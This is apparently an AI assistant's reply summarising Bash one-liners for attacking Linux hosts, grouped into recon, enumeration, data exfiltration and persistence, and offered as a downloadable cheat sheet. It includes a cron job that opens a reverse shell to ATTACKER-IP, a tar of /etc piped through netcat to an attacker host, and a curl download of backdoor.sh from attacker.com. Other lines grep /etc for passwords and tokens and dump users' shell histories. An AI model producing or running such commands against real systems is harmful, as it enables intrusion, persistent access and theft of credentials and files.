Here's a clean summary of all the Bash one-liners from the guide, grouped by category for quick reference:

---

## 🧾 Summary of Bash One-Liners

### 🔥 Core Info Gathering & Recon
```bash
python3 -m http.server 8080
find / -perm -4000 -type f 2>/dev/null
for user in $(cut -d: -f1 /etc/passwd); do crontab -u $user -l 2>/dev/null; done
for port in {20..1024}; do (echo >/dev/tcp/10.10.10.5/$port) && echo "Port $port open"; done 2>/dev/null
ip a | grep inet
```

### 🕵️‍♂️ Enumeration & Post-Exploitation
```bash
cut -d: -f1 /etc/passwd
find / -type f -perm -o+w 2>/dev/null
grep -iR 'password\|secret\|key\|token' /etc 2>/dev/null
watch -n 1 ss -tuna
find /home /root -name ".*history" -exec cat {} \; 2>/dev/null
```

### 🧠 Data Extraction & Movement
```bash
scp payload.sh user@192.168.1.5:/tmp
tar czf - /loot | ssh user@remote "tar xzf - -C /tmp"
grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,6}" * 2>/dev/null | sort -u
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' /var/log/* 2>/dev/null | sort -u
curl -sO http://attacker.com/backdoor.sh
```

### 💣 Persistence, Priv-Esc & Lateral Movement
```bash
echo "* * * * * bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1" | crontab -
find / -type d -writable 2>/dev/null
tar czf - /etc | nc ATTACKER-IP 1234
nc -lvp 1234 > data.tar.gz
docker ps -a 2>/dev/null
cat /var/mail/root 2>/dev/null
```

### 🎭 Obfuscation, Encoding, Decryption
```bash
echo 'U29ja3M=' | base64 -d
echo 4861636b | xxd -r -p
tr -dc A-Za-z0-9 </dev/urandom | head -c 16; echo
whoami && uname -a && id && uptime
```

---

Let me know if you'd like this turned into a downloadable cheat sheet or formatted for a terminal-friendly reference!
